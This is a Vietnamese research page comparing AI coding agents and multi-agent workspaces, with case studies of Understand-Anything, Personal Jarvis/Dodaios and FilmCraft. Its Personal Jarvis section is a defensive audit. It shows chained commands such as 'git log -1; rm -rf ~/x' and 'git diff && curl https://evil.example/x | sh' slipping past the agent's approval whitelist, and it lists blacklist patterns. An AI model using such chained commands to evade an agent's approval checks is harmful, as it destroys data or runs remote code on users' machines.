# 01 · AI Coding Agents

> Các agent/trợ lý lập trình chạy trong terminal, IDE hoặc cloud. Số sao ước lượng tại 9–10/2026, đối chiếu từ nhiều nguồn (xem cuối trang).

## 1. Bảng tổng hợp

### 1.1 Mã nguồn mở (CLI / tự host)

| Dự án | Repo | License | ★ (ước lượng) | Điểm nổi bật | Ghi chú |
|---|---|---|---|---|---|
| **OpenCode** | github.com/sst/opencode | MIT | ~210k | CLI/TUI agent đa model, provider-agnostic, LSP tích hợp | Nhiều nguồn xếp #1 nhóm mở (9/2026) |
| **DeepSeek Harness** | github.com/deepseek-ai/deepseek-harness | MIT | ~200k (2 tuần sau 13/8/2026) | Kiến trúc "mọi thứ là plugin": UI, tool call, context injection, cả agent loop đều thay được; hỗ trợ model local | Developer preview, chưa nhận PR ngoài; số sao giữa các nguồn chênh lệch (95k→203k) |
| **OpenAI Codex CLI** | github.com/openai/codex | Apache-2.0 | ~127k | Agent terminal chính thức của OpenAI, sandbox, multi-agent orchestration | Rust rewrite |
| **Gemini CLI** | github.com/google-gemini/gemini-cli | Apache-2.0 | ~107k | Agent terminal của Google, free tier rộng, MCP | |
| **OpenHands** (cũ: OpenDevin) | github.com/OpenHands/OpenHands | MIT | ~90k | Nền tảng agent dev đầy đủ (sandbox Docker, web UI, cloud), nhiều SOTA SWE-bench | Đổi tên từ All-Hands-AI |
| **Cline** | github.com/cline/cline | Apache-2.0 | ~69k | VS Code extension agent, plan/act mode, MCP marketplace | |
| **Aider** | github.com/Aider-AI/aider | Apache-2.0 | ~49k | Pair-programming terminal, repo map, git-native | Commit cuối 5/2026 → phát triển chậm lại |
| **SWE-agent** | github.com/SWE-agent/SWE-agent | MIT | ~20.5k | Princeton; agent-computer interface, giải GitHub issue tự động | Nghiên cứu; HEAD main 16/7/2026 dù pushed_at 26/10, xem §3l |
| **mini-SWE-agent** | github.com/SWE-agent/mini-swe-agent | MIT | ~8.4k | **100 dòng code**, >74% SWE-bench Verified; là harness chuẩn của Vals leaderboard | Minh chứng "harness đơn giản vẫn mạnh" |
| **Goose** | github.com/block/goose | Apache-2.0 | – | Agent desktop/CLI của Block, MCP-first | |
| **Roo Code / Kilo Code** | github.com/RooCodeInc/Roo-Code | Apache-2.0 | – | Fork Cline, nhiều mode | Roo Code **đã archive** (5/2026). Kilo Code 7.x **không còn là fork Roo**: lõi là fork OpenCode (MIT), xem §3j |

### 1.2 Thương mại / mã đóng

| Sản phẩm | Hãng | Hình thức | Giá tham khảo | Điểm nổi bật |
|---|---|---|---|---|
| **Claude Code** | Anthropic | CLI + IDE + web/cloud | theo gói Claude | Repo ~148k★ nhưng mã đóng; hooks, skills, subagents, plugins (`ralph-loop`), `/loop`, worktree |
| **Cursor** | Anysphere | VS Code fork | Pro $20 / Pro+ $60 / Ultra $200 | Mạnh nhất cho multi-file; cloud agents song song; đọc SKILL.md từ 2.4 (1/2026) |
| **Windsurf → Devin Desktop** | Cognition | IDE | ~$15–20 | Sau khi Cognition mua Windsurf, vận hành dưới tên Devin Desktop (nguồn chưa thống nhất) |
| **Devin** | Cognition | Cloud agent | $20 beta / $500 seat ent. | Agent "kỹ sư phần mềm" đầu tiên |
| **GitHub Copilot** | GitHub/MS | IDE + coding agent | $10 / $19 / $39 | Mặc định cho team GitHub; agent kém Cursor/Claude Code theo review |
| **Google Jules** | Google | Cloud async agent | free 15 task/ngày | Tốt cho test & PR trên repo Python |
| **OpenAI Codex (cloud)** | OpenAI | Cloud agent | trong ChatGPT Plus $20 / Pro $100+ | Chạy song song nhiều task trong sandbox |

### 1.3 Agent workspace / ADE – chạy nhiều coding agent song song (thêm 2026-10-12)

Lớp **không phải agent** mà là "bàn làm việc" bọc các CLI agent ở bảng 1.1/1.2: mỗi agent một pane/worktree, so sánh kết quả, review diff. ★ đọc trên trang GitHub 12/10/2026 trừ khi ghi khác.

| Dự án | Repo | License | ★ | Cách tiếp cận | Ghi chú |
|---|---|---|---|---|---|
| **Personal Jarvis** | github.com/Dodaios/Dodaios (cũ: PersonalJarvis/PersonalJarvis) | Apache-2.0 (≤1.6.0 là MIT) | 183 | "Super-app": ADE nhiều pane + giọng nói/wake word + computer use + agent nền có memory + marketplace | Case study §3c; Python + React, 1 tác giả chính |
| **T3 Code** | github.com/pingdotgg/t3code | MIT | ~27,1k | "Agent harness control surface": điều khiển agent trên máy mình qua web/desktop/mobile | Personal Jarvis mượn code thread/timeline và trang Computers (NOTICE) |
| **Vibe Kanban** | github.com/BloopAI/vibe-kanban | Apache-2.0 | ~28,3k | Bảng kanban, mỗi thẻ = một agent trong worktree riêng | README ghi **đang sunset**, chuyển cho cộng đồng |
| **Orca** | github.com/stablyai/orca | MIT | chưa rõ (10k–43k tùy nguồn) | Fan-out 1 prompt sang nhiều CLI agent, mỗi agent một worktree, chọn bản thắng để merge | Số sao các nguồn lệch nhau ~4× → **(chưa xác minh)** |
| **Munder Difflin** | github.com/HarnessMD/munder-difflin (cũ: chaitanyagiri/…) | MIT (open-core, Pro US$150/năm) | 8,7k | "Văn phòng" agent: mỗi CLI một PTY + avatar, agent điều phối "Michael", hive bằng file + git | Chế độ auto chạy `bypassPermissions` (trừ Codex); xem mục 02 §4b |
| **Omnigent** | github.com/omnigent-ai/omnigent | Apache-2.0 | ~10,8k | "Meta-harness" của Databricks: server + web/desktop/mobile bọc Claude Code, Codex, Cursor, OpenCode, Pi…; policy ba tầng, sandbox đám mây, chia sẻ phiên | Case study §3f; alpha, 7 GHSA trong 4 tháng |
| **Claude Squad** | github.com/smtg-ai/claude-squad | AGPL-3.0 | ~8,6k | TUI trên tmux + git worktree, quản lý Claude Code/Codex/OpenCode/Amp | Nhẹ nhất, chỉ terminal |
| **ThinkRail** | github.com/JetBrains/thinkrail | Apache-2.0 | ~5,8k (29/10) | IDE "thật" (Monaco + terminal + diff) bọc **một** agent `pi` chạy in-process; mỗi workspace = git worktree chạy song song; "living specs" = đồ thị `SPEC.md` agent đọc/ghi; hỗ trợ Agent Skills + MCP | JetBrains InnovationHub (**incubator**, không phải sản phẩm chính); desktop app hoặc web qua CLI `thinkrail`; v0.2.0 (18/10/2026); extension support còn trong roadmap; ảnh 29/10 (5.774★, 304 fork, 275 issue khớp API GitHub) badge "GitHub Trending Repo of the Day #1" **(theo ảnh, chưa xác minh)** |
| **Conductor** | Melty Labs (đóng) | thương mại | – | App Mac, agent song song mỗi cái một worktree, panel review diff | Chỉ macOS (theo bài so sánh, chưa xác minh) |

## 2. Benchmark & cách đánh giá

| Benchmark | Trạng thái 10/2026 | Top |
|---|---|---|
| SWE-bench Verified | **Bão hòa**: Vals ngừng chấm model mới từ 1/9/2026; OpenAI tuyên bố (2/2026) không còn đo được frontier | Claude Opus 5 (mini-SWE-agent) 97.0%, DeepSeek V4 Pro 96.4%, GPT-5.6 Sol 96.2% |
| SWE-bench Pro (Verified) | Benchmark kế nhiệm, khó hơn | Claude Opus 5.5 ~65% (6/10/2026) |
| Khác | SWE-Touch (người dùng sửa code giữa chừng), RoadmapBench (nâng cấp version dài hạn), UTBoost | Đang nổi trong giới học thuật |

**Bài học:** chọn agent theo (1) harness có kiểm soát được không, (2) license, (3) chi phí token, (4) tích hợp MCP/skills; đừng dựa vào số sao.

## 3. Xu hướng kiến trúc đáng chú ý

- **Harness > Model**: các paper 2026 ("Harness Engineering: Source-Code Study of Eleven Systems", "Inside the Scaffold") cho thấy phần lớn chất lượng đến từ vòng lặp, công cụ, quản lý ngữ cảnh.
- **Plugin hóa toàn bộ** (DeepSeek Harness) và **tối giản hóa** (mini-SWE-agent) là 2 cực cùng tồn tại.
- **Cloud/async agents** (Codex cloud, Jules, Cursor cloud agents, Claude Code web) → lập trình viên trở thành người ra đề & review.
- **Memory có cấu trúc** cho agent ("Your Code Agent Can Grow Alongside You", 2026).

## 3b. Case study: Understand-Anything – codebase thành knowledge graph (trending, 2026-10-12)

> Nguồn: ảnh bảng trending người dùng gửi ("Understand-Anything: +2.331 sao/ngày"). Nghiên cứu từ repo (README, cấu trúc, CLAUDE.md), trang org, trendshift, bài Better Stack / Augment Code, các directory skill.

### 3b.1 Hồ sơ nhanh

| Thuộc tính | Giá trị (đọc 2026-10-12) |
|---|---|
| Repo | https://github.com/Egonex-AI/Understand-Anything (URL cũ `Lum1104/Understand-Anything` redirect về đây; mirror `GoodDingo/understand-anything`) |
| Tác giả | Yuxiang Lin · Infinite Universe, Inc. (dòng bản quyền); org **Egonex-AI** ("Understand anything. Understand anyone."), website egonexai.com, 1 repo public, không member public |
| Ngôn ngữ / license | TypeScript, pnpm workspaces, Tree-sitter, Vite, Vitest; **MIT** |
| Số liệu | **85,9k★**, 7,2–7,5k fork, 42 contributor, 857 commit, 117 issue mở, 200 PR mở; cập nhật 10/10/2026 |
| Trending | #1 GitHub Trending TypeScript 4 ngày (21–28/5/2026, lần đầu 23/5); trendshift +6.836★/61 ngày (13/8–12/10), đỉnh 12–14/9 (+227/+240/+241 mỗi ngày); ảnh người dùng gửi ghi +2.331★/ngày (đợt sóng mới) |
| Tagline | "Graphs that teach > graphs that impress" |

### 3b.2 Nó làm gì

- Biến code (hoặc docs, wiki kiểu "Karpathy LLM wiki") thành **knowledge graph tương tác**: node là file/hàm/class, cạnh là import/call/kế thừa; tóm tắt tiếng Anh thường, **guided tour** theo thứ tự phụ thuộc, tìm fuzzy + ngữ nghĩa, **diff impact analysis**, phân lớp (API/Service/Data/UI/Utility), view business logic (domain → flow → step), UI thích ứng persona (junior dev, PM, power user), giải thích 12 pattern ngôn ngữ trong ngữ cảnh; đầu ra đa ngôn ngữ gồm **tiếng Việt** (en, zh, zh-TW, ja, ko, ru, vi).
- Lệnh: `/understand` (lưu `.ua/knowledge-graph.json`; `--language`, `--auto-update` tạo post-commit hook), `/understand-dashboard`, `/understand-chat`, `/understand-diff`, `/understand-explain`, `/understand-onboard`, `/understand-domain`, `/understand-knowledge`.
- Cài: `/plugin marketplace add Egonex-AI/Understand-Anything` → `/plugin install understand-anything`; nền tảng khác qua `install.sh`/`install.ps1` (Codex dùng tiền tố `$`). Hỗ trợ: Claude Code (plugin gốc), Cursor, VS Code + Copilot, Copilot CLI, Codex, OpenCode, OpenClaw, Antigravity, Gemini CLI, Pi Agent, Vibe CLI, Hermes, Cline, KIMI CLI, Trae, Nanobot, Kiro.
- Chia sẻ team: commit graph (trừ `.ua/intermediate/` và `diff-overlay.json`), graph lớn dùng git-lfs; viewer read-only `npx` (Node ≥18) không cần Claude Code.

### 3b.3 Cách hoạt động (điểm đáng học)

| Lớp | Cơ chế | Vì sao quan trọng |
|---|---|---|
| **Tất định** | Tree-sitter trích import/export/định nghĩa/call site/kế thừa; cùng input → cùng output; cũng là cơ sở **incremental** (chỉ phân tích file đổi) | Giảm hallucination cấu trúc, giảm token lần sau |
| **Ngữ nghĩa** | LLM sinh summary, tag, layer, domain mapping, tour, concept callout | Phần "dạy" người đọc |
| **Pipeline đa agent** | project-scanner → file-analyzer (song song tối đa 5 worker, 20–30 file/batch) → architecture-analyzer → tour-builder → graph-reviewer; thêm domain-analyzer, article-analyzer | Chia việc theo vai trò + có **reviewer** kiểm graph (evaluator pattern, mục 03) |
| **Đóng gói** | Cùng một lõi, nhiều thư mục plugin (`.claude-plugin`, `.copilot-plugin`, `.cursor-plugin`) + installer | Mẫu "một skill, nhiều host" (mục 04/20) |

README tự cảnh báo: lần chạy đầu trên codebase lớn **tốn nhiều token**; gợi ý gói subscription hoặc model local (Ollama, mục 10).

### 3b.4 Đánh giá

- **Điểm mạnh:** lai tất định + LLM đúng chỗ; incremental; output kiểm tra được (JSON trong repo); viewer không cần agent; đa host; đa ngôn ngữ (có vi).
- **Rủi ro / lưu ý:** phần lớn bài viết bên ngoài là aggregator/khuyến mãi, chưa có đánh giá độc lập về độ chính xác graph; một trang trending (trendingrepo.com) gắn cờ "có thể star-farming" cho bản owner cũ — **chưa xác minh**, nhưng tốc độ +2k★/ngày sau 5 tháng ra mắt là bất thường và đáng theo dõi (so sánh ADHD, Anatomy, OpenMontage ở mục 03/06/19 đều có đợt sóng tương tự). Chi phí token lần đầu; graph lớn cần lfs; 200 PR mở cho thấy maintainer quá tải.
- **Vị trí trong kho:** công cụ "đọc hiểu codebase" cho coding agent, cùng nhóm với Context7/llms.txt (mục 16) và memory có cấu trúc (mục 10). Đáng thử cho onboarding dự án lạ và review tác động diff trước khi vào Ralph loop (mục 03).

### 3b.5 Cập nhật 2026-10-30 (yêu cầu người dùng, clone lại)

| Mục | 12/10/2026 | 30/10/2026 |
|---|---|---|
| ★ / fork | 85,9k / 7,2–7,5k | **89k / 7,5k** (shields) |
| Commit / tác giả | 857 / 42 | **866 / 85** (git shortlog; 42 là số "contributor" trên trang GitHub, cách đếm khác) |
| Issue / PR mở | 117 / 200 | **126 / 211** |
| Phiên bản | – | tag mới nhất **v2.9.0 (10/7/2026)**, nhưng `plugin.json` đã là **2.9.8** → bản phát hành đi theo plugin, không theo tag |

- **Nhịp phát triển chậm hẳn:** chỉ 7 commit từ 12/10 (sửa import-map Python, Makefile, thêm issue template), trong khi sao vẫn tăng ~3k. Đợt "+2.331★/ngày" (§3b.1) không đi kèm hoạt động mã tương ứng; số PR mở tiếp tục tăng → maintainer quá tải là rủi ro chính.
- **Đã có từ trước nhưng hồ sơ §3b chưa ghi:** skill **`/understand-figma`** + agent `design-analyzer` (từ 24/6/2026) đọc file Figma qua **Figma REST API** (cần token Figma) và dựng graph thiết kế (page, screen, component, token); agent `assemble-reviewer`; tổng **10 agent, 9 skill** (§3b.3 ghi 7 agent).
- **Hook thật** (`understand-anything-plugin/hooks/hooks.json`): chỉ 2 hook — PostToolUse `Bash` (gợi ý cập nhật graph sau commit) và SessionStart (kiểm `autoUpdate` trong `config.json` của `.understand-anything/` hoặc `.ua/`). Không thấy telemetry trong mã (grep `posthog|telemetry|analytics` 30/10/2026). Dữ liệu chỉ rời máy qua model của chính agent host (và Figma API khi dùng skill Figma).
- **Thư mục dữ liệu:** mặc định `.ua/` (như §3b.2); dự án đã có `.understand-anything/` (tên cũ) tiếp tục dùng thư mục đó, không cần chuyển; installer ngoài Claude Code clone repo vào `~/.understand-anything/repo` rồi symlink.
- **CI:** 2 workflow (ci, deploy-homepage), 67 file test (Vitest) — mỏng hơn nhiều so với claude-mem (1.098) hay ECC (483).
- Nhận định ở §3b.4 giữ nguyên. Lựa chọn thay thế tất định, không cần LLM cho phần code: Graphify (mục 16 §2d, §2e).

**Nguồn §3b.5:** clone github.com/Egonex-AI/Understand-Anything 30/10/2026 (blob:none, 866 commit, HEAD 4e6d329 26/10/2026; README.md, SECURITY.md, understand-anything-plugin/{.claude-plugin/plugin.json, hooks/hooks.json, agents/*.md, skills/*/SKILL.md}, .github/workflows/*; git log/tag/shortlog) · img.shields.io/github/{stars,forks,license,last-commit,v/release,issues,issues-pr}/Egonex-AI/Understand-Anything.json (30/10/2026)

## 3c. Case study: Personal Jarvis (Dodaios) – "super-app" agent cho desktop (ảnh README người dùng gửi, 2026-10-12)

> Nguồn: ảnh chụp README người dùng gửi. Nghiên cứu bằng clone đầy đủ lịch sử (commit `e28f53f`, 11/10/2026), đọc `README.md`, `AGENTS.md`, `NOTICE`, `LICENSE`, `jarvis.toml.example`, `jarvis/safety/*`, `jarvis/core/config.py`, `.github/workflows/`; trang GitHub, PyPI, personaljarvis.ai; tìm HN/Reddit (không thấy thảo luận độc lập).

### 3c.1 Hồ sơ nhanh

| Thuộc tính | Giá trị (đọc 2026-10-12) |
|---|---|
| Repo | https://github.com/Dodaios/Dodaios — **đổi tên từ `PersonalJarvis/PersonalJarvis`** 10–11/10/2026 (PR #525, #526, #530; URL cũ vẫn redirect). PyPI `personal-jarvis` còn trỏ homepage về URL cũ, nhưng attestation bản 3.1.1 ghi repo Dodaios |
| Tác giả | Ruben Lütke (Đức): **5.777/5.839 commit** (~99%); 3 người khác 10–14 commit; 2 commit ký "Claude" |
| Tuổi / nhịp | Commit đầu 19/6/2026 → 105 ngày có commit, đỉnh **264 commit/ngày** (1/7/2026); 71 tag, v3.1.1 (10/10/2026); 378 commit "auto-save WIP via Claude stop-hook" |
| Quy mô | ~664k dòng Python trong `jarvis/` (74 package con), frontend React, 2.564 file `test_*.py`, 23 workflow GitHub Actions, `CHANGELOG.md` 212 KB |
| License | **Apache-2.0** từ 2.0.0 (commit 27/8/2026 "switch from MIT to Apache 2.0"); bản ≤1.6.0 vẫn MIT. Có `TRADEMARK.md` (không liên kết Marvel/Disney…) |
| Số liệu GitHub | 183★, 70 fork, 4 watcher, 33 issue, 56 PR mở; 20 topic (`claude-code`, `computer-use`, `wake-word`, `mcp`…) |
| Cài đặt | `irm …/install.ps1 \| iex` / `curl … install.sh \| bash`, installer .exe/.dmg/AppImage (macOS chưa notarize, Windows chờ SignPath), hoặc `pip install personal-jarvis` + `jarvis serve` (headless, cổng 47821) |

### 3c.2 Nó làm gì (theo README, đã đối chiếu thư mục)

- **Agentic IDE**: nhiều pane terminal thật, mỗi pane chạy một CLI (Claude Code, Codex, OpenCode, Kimi Code, GLM, Grok Build, Antigravity, Cursor CLI, DeepSeek Harness); pane có **call sign T1, T2…** để ra lệnh bằng giọng ("Tell T1 to write the tests"), gửi cùng một task cho nhiều pane rồi so sánh. Dùng subscription có sẵn của người dùng (`jarvis/claude_auth.py`, `codex_auth.py`, `*_quota_state.py`).
- **Jarvis Agents**: agent sống lâu, mỗi agent một chat không kết thúc, ghi chú riêng ("self-learning"), routine theo lịch; mission dài chạy trong **git worktree**, tách worker song song, qua bước review. Có phần chuyển thể từ `NousResearch/hermes-agent` (`third_party/hermes-agent`, MIT).
- **Giọng nói**: wake word tự chọn, hội thoại ngắt lời được, dictation vào mọi app, gọi điện (Twilio); STT/TTS chạy offline được (Silero VAD).
- **Computer use** desktop + trình duyệt; **marketplace** >40 plugin/MCP/skill/CLI; memory dạng **wiki local** có trích dẫn; Routines; Appshots; "Jarvis Verse" 3D; pet trên desktop; kênh Telegram/Discord; CLI `jarvis` + API local.

### 3c.3 Đọc cổng thật thay vì văn xuôi (mục 23, WORKFLOW)

| Tuyên bố README | Code / cấu hình thật | Nhận xét |
|---|---|---|
| "Every action passes a risk check with four levels: safe, monitor, ask and block. Anything that could change your system waits for your approval" | `jarvis/safety/risk_tier.py`: thứ tự **blacklist → whitelist → tier mặc định của tool** (+ hook `risk_tier_for_args`). `config.py`: `approval_mode` mặc định **`"bypass"`**, `default_tier = "safe"`; chỉ tier `ask` mới hỏi | Mặc định là **không hỏi** cho việc do app tự chạy; README nói ngược lại. Docs `safety-and-approvals.md` có thừa nhận kết nối kế thừa "monitor default" chạy không hỏi |
| Blacklist chặn lệnh nguy hiểm | `fnmatch` trên chuỗi `"<tool> <args>"` và `"<args>"`; blacklist mặc định chỉ 5 mẫu (`format *`, `rm -rf /`, `del /f /s /q C:\`…). Docstring ghi audit 8/8/2026 phát hiện **mọi mẫu blacklist mặc định từng "chết"** với `run_shell` | Glob khớp chuỗi dễ né (`rm -rf ~`, khoảng trắng kép, `bash -c`) |
| Lệnh phá huỷ sẽ hỏi trước | `command_impact.py` tách `&&`, `;`, `\|` và xếp loại read/modify/destructive — **nhưng chỉ chạy ở bước 3**; whitelist mặc định có `"git log *"`, `"git diff *"` và **thắng trước** | `fnmatchcase("git log -1; rm -rf ~/x", "git log *") == True` → lệnh nối sau whitelist được hạ xuống `safe`, bỏ qua bộ phân loại (phân tích tĩnh 12/10/2026; **16/10/2026 đã gọi `RiskTierEvaluator.evaluate` thật và xác nhận**, xem §3c.5) |
| — | `AGENTS.md` là file hướng dẫn duy nhất; `.claude/{agents,skills}` và `.codex/agents/*.toml` là bản sinh, CI (`scripts/ci/check_agents_md.py`) chặn `CLAUDE.md` | Mẫu "một nguồn, nhiều host" giống mục 04/20 |
| — | `AGENTS.md` §1 "Traps no one guesses": working tree **dùng chung** giữa nhiều phiên agent (cấm `git add -A`); probe vào app thật **tốn tiền thật** (5 lượt test từng tốn $6,82); cấm Chrome headless (từng ghim CPU 100%); mọi reconnect phải jitter (từng cạn cổng ephemeral) | Sổ bẫy cụ thể, có mã AP-n/BUG-n — cùng tinh thần `TRAPS.md` mục 03/23 |

### 3c.4 Đánh giá

- **Điểm mạnh:** gom ADE + voice + computer use + agent nền vào một app local, không cần tài khoản, dùng lại subscription sẵn có; ghi công bên thứ ba cẩn thận (`NOTICE` liệt kê T3 Code, hermes-agent, Silero); `AGENTS.md` là ví dụ tốt về sổ bẫy thực chiến cho codebase do agent viết; có release bot, scorecard, attestation, nhiều workflow smoke đa nền tảng.
- **Rủi ro:** (1) **bus factor = 1** và nhịp 50–260 commit/ngày cho thấy phần lớn code do agent sinh — 664k dòng Python sau ~4 tháng khó audit; (2) mặc định `bypass` + whitelist thắng bộ phân loại lệnh là khoảng hở thật cho app có quyền điều khiển máy (mục 12); (3) cài bằng `curl | bash`/`irm | iex`, binary macOS chưa notarize, Windows chưa ký; (4) đổi tên repo, đổi license MIT→Apache trong 4 tháng → link/PyPI chưa đồng bộ; (5) cộng đồng nhỏ (183★), chưa có review độc lập — phần tính năng đều là **tự công bố**; (6) trùng tên với `open-jarvis/OpenJarvis` (Stanford, ~11k★, Apache-2.0, local-first nhưng thiên về framework + đo hiệu năng/năng lượng) và nhiều fork/mirror `*/PersonalJarvis`.
- **So với nhóm ADE (§1.3):** T3 Code/Orca/Claude Squad chỉ làm "bàn điều phối" và giữ phạm vi hẹp; Personal Jarvis là cực "làm tất cả", gần OpenClaw/Hermes Agent (mục 02) hơn là một IDE. Chọn T3 Code hoặc Claude Squad nếu chỉ cần chạy agent song song; thử Personal Jarvis nếu muốn điều khiển bằng giọng nói, nhưng đặt `approval_mode = "ask"` và xoá whitelist `git log *`/`git diff *` (hoặc chỉ whitelist lệnh không tham số) trước khi giao quyền computer use.
- **Bài học đem về kho:** (a) **call sign cho pane** là giao diện điều phối bằng giọng rẻ mà hiệu quả; (b) allowlist kiểu glob trên chuỗi lệnh phải chạy **sau** bộ tách lệnh nối, không trước (mục 12 §4); (c) stop-hook auto-commit WIP là lưới an toàn, nhưng sinh 378 commit nhiễu → nên squash trước khi merge.

### 3c.5 Cập nhật 2026-10-16: ảnh README gửi lại, tên mới Dodaios, lỗ whitelist đã kiểm bằng chạy thật

> Người dùng gửi lại ảnh đầu README: tiêu đề "Personal Jarvis", "The open-source AI agent super-app for your desktop…", huy hiệu pypi v3.1.1 · License Apache 2.0 · CI passing · Discord, link Install · Website · Docs · Discord · X, video `personal-jarvis-demo-2026-10-02-v2.mp4` (3:24). Đã clone lại (HEAD `ae629b4b1` 15/10/2026; 144 commit kể từ `e28f53f`).

| Ô trong ảnh | Kiểm | Ghi chú (16/10/2026) |
|---|---|---|
| Tiêu đề "Personal Jarvis" | ⚠️ cũ | Sản phẩm đã **đổi tên thành Dodaios** trong tài liệu (#546, 12/10), giao diện (#694, 14/10) và thư mục con (#661). Gói Python vẫn là `jarvis/`, file cấu hình vẫn `jarvis.toml` |
| "The open-source AI agent super-app for your desktop" | ⚠️ cũ | README nay viết "Dodaios is an open-source **agent OS** for your desktop… keeps you in control". Tính năng nêu trong ảnh (chạy nhiều coding agent song song, nói chuyện với máy, agent làm việc khi vắng người) vẫn có |
| pypi v3.1.1 | ⚠️ cũ | PyPI `personal-jarvis` **3.2.0** (tag 13/10/2026); `project_urls` nay đã trỏ về repo Dodaios (12/10 còn trỏ URL cũ) |
| License Apache 2.0 | ✅ | Từ 2.0.0; bản ≤1.6.0 vẫn MIT |
| CI passing, Discord | — | Huy hiệu động, không kiểm được từ ảnh |
| Link Install · Website · Docs · Discord · X | ✅ | Có trong README |

**Số liệu:** 223★, 80 fork (shields 16/10/2026; 12/10 là 183★/70 fork). 140/144 commit mới do Ruben Lütke, còn lại là bot: bus factor vẫn = 1.

**Lỗ whitelist (§3c.3) vẫn còn, nay đã kiểm bằng chạy thật.** Ở HEAD, `jarvis/safety/risk_tier.py` vẫn xét blacklist → **whitelist** → tier mặc định của tool; `approval_mode` mặc định vẫn `"bypass"` (`jarvis/core/config.py`). Whitelist trong code mặc định rỗng, nhưng `jarvis.toml.example` có `"git log *"`, `"git diff *"`, và script đóng gói Linux/macOS **chép file này thành `jarvis.toml` mặc định** của bản cài. Nạp đúng file `risk_tier.py` ở HEAD (chỉ stub hai module kiểu `jarvis.core.config`, `jarvis.core.protocols`) rồi gọi `evaluate` với tool `run_shell`, whitelist/blacklist lấy từ `jarvis.toml.example`:

| Lệnh | Kết quả |
|---|---|
| `rm -rf ~/x` (đối chứng) | `tier=ask` |
| `git log -1; rm -rf ~/x` | **`tier=safe`**, `approved_by=whitelist`, khớp `git log *` |
| `git diff && curl https://evil.example/x \| sh` | **`tier=safe`**, `approved_by=whitelist`, khớp `git diff *` |

Lệnh xoá đứng một mình bị hỏi; nối sau `git log` thì được coi là an toàn. Đây là kết luận ở **mức hàm đánh giá rủi ro**. Chưa chạy trong app đầy đủ, nên chưa loại trừ khả năng một lớp khác (bộ thực thi shell) chặn lại. README vẫn viết "Anything that could change your system waits for your approval". Commit an toàn duy nhất trong 4 ngày (`1a553dc04`, #631) chỉ ghi nguồn gốc của đích tool call, "No tier changes".

**Cách xử lý:** repo có `SECURITY.md` với kênh báo riêng (GitHub private vulnerability reporting). Lỗ này nên báo qua kênh đó, không mở issue công khai. Khi dùng: đặt `approval_mode = "ask"` và xoá `git log *`, `git diff *` khỏi whitelist (§3c.4).

## 3d. Case study: FilmCraft — "Premiere Pro viết lại bằng Rust, 343K dòng từ 6 dòng, 11 ngày" (ảnh người dùng gửi, 2026-10-12)

> Kiểm từng con số trong ảnh bằng lịch sử git đầy đủ của repo, tài liệu `ROADMAP.md`, `docs/target-app-parity.md`, `docs/gaps.md` và issue tracker; nguồn ngoài tra cùng ngày.

### 3d.1 Hồ sơ nhanh

| Mục | Thông tin (12/10/2026) |
|---|---|
| Repo | `storytold/filmcraft` · **~10,9k★**, 4,3k fork, 1.757 commit, 299 issue mở, 131 PR mở; license MIT OR Apache-2.0 |
| Định vị | "An open-source, nonlinear video editor written from scratch in pure Rust" (bản cũ ghi "clean-room reimplementation of Adobe Premiere Pro") |
| Tác giả | Brandon Thomas (`echelon`), ArtCraft / Storyteller.ai; một trong loạt "Crafting Apps" dựng lại bộ Adobe (PhotoCraft, VectorCraft, LightCraft…). Biểu tượng cú là icon thật của dự án, vẽ bằng ArtCraft |
| Phát hành | v0.1.0 (2/10) → v0.6.0 (11/10/2026), 0.7.0 đang chuẩn bị; binary Windows, macOS, Linux, FreeBSD, web |
| Đón nhận | PetaPixel, Gizmodo, Phoronix, TweakTown ("Software is over"), HN — chính tác giả viết "super early alpha… not anywhere close to ready" |

### 3d.2 Ba con số trong ảnh, đối chiếu repo

| Ảnh nói | Thực tế | Kết luận |
|---|---|---|
| **343K dòng** | `docs/target-app-parity.md`: "measured 2026-10-10: 45 crates + 3 apps, ~343,000 lines of Rust, 2,520 `#[test]` functions"; đếm lại 12/10: 392.739 dòng `.rs`, khoảng 340,7k dòng không trống, không comment | Đúng |
| **"từ 6 dòng"** | Là **commit đầu tiên** (`16489ce`, 30/9/2026): 2 dòng `.gitignore` + 4 dòng README — **không phải một prompt 6 dòng**. Chính commit đó ignore thư mục `plan/`; `CLAUDE.md` bảo agent làm theo `plan/execution-plan.md`, tài liệu kiến trúc và ảnh chụp Premiere làm mẫu — tất cả không công khai. 11 phút sau đã có skeleton workspace, 67 phút sau có 68 file `.rs` (giao diện egui, decoder H.264 CABAC, MCP server) | Gây hiểu lầm; nhiều khả năng có công chuẩn bị trước lịch sử công khai **(chưa xác minh)** |
| **11 ngày** | 30/9 → 10/10/2026 là 11 ngày, khớp tài liệu | Đúng về thời gian, nhưng không phải "một người + AI": **94 tên tác giả**; tài liệu ghi 243 PR từ 5/10 "most from community contributors' agents"; riêng 10–11/10 có 820 commit |
| **"??% con số giấu kín"** | Không tìm thấy nguồn của ảnh **(chưa xác minh)**. Ứng viên: số tự đánh giá của dự án (~86% "feature breadth", ~56% "ready for real work"), hoặc tỉ lệ commit do Claude đồng tác giả: **735/1.015 commit không phải merge (~72%)**, phần lớn ghi "Claude Opus 5.5"; nhánh `worktree-agent-…` cho thấy nhiều phiên Claude Code chạy song song trong git worktree | — |

### 3d.3 Chạy được tới đâu

- **Làm được nhiều thật:** codec tự viết (H.264 mã hoá/giải mã; HEVC, AV1 giải mã; ProRes, AAC, VP9, Opus, DNxHD, MPEG-2/AC-3), FFmpeg chỉ dùng làm **oracle cho test** chứ không nằm trong sản phẩm; giao diện egui, compositor wgpu theo linear light; trao đổi FCP7 XML, FCPXML, OTIO, EDL, AAF, OMF; multicam, chỉnh màu, keyframe, phụ đề; hơn 650 lệnh mà agent gọi được qua MCP.
- **Không có cổng test:** `ROADMAP.md` tự ghi "no workflow runs the tests today" — CI chỉ có release và đóng gói, 2.520 test tồn tại nhưng không chặn merge.
- **Crash khi mở** trên macOS 12, Intel UHD, Windows 11 (`docs/gaps.md` G4; issue #468, #512, #380, #1290…), export treo.
- **Thiếu:** import `.prproj` (chặn bản beta), plugin VST3/AU/OpenFX, xuất HEVC/AV1 bằng phần mềm, phần lớn tính năng AI.
- **"Parity" tự đo:** "Effects 100%" nghĩa là effect có mặt và qua test; "Menus 92%" là diff nhãn menu — chưa đo độ trung thực so với Premiere (harness fidelity còn "upcoming"). Dự án tự ước cần thêm 400–700 giờ agent mới tới beta.
- **Cảnh báo tải về:** repo nhái `filmcraft-app/filmcraft` (2★) có README "Download filmcraft" kèm link `.7z`/`.run` — kiểu mồi malware quen thuộc **(chưa xác minh)**; chỉ tải từ release của `storytold/filmcraft` hoặc getartcraft.com.

### 3d.4 Bài học

